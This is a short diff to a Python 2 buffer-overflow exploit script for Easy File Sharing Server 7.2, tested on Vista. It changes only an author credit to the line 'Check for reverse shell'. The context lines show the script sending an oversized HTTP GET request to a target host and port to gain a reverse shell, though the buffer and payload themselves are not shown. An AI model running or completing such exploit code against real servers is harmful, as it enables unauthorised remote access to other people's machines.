@@ -9,7 +9,7 @@ port= 80
 #
 #[*]Buffer Sent[*]
 #
-#This shell has been brought to you by Gr1zz1y
+#Check for reverse shell
 
 #Easy File Sharing Server 7.2 // Tested on Vista Ultimate x86
 #No bad characters discovered
@@ -74,4 +74,4 @@ print "[*]Target acquired ----> " + host + ":" + str(port) + "\r\n"
 s.send("GET " + buffer + " HTTP/1.0\r\n\r\n")
 print "[*]Buffer sent[*]\r\n"
 s.close() 
-print "This shell has been brought to you by Gr1zz1y"
+print "Check for reverse shell"
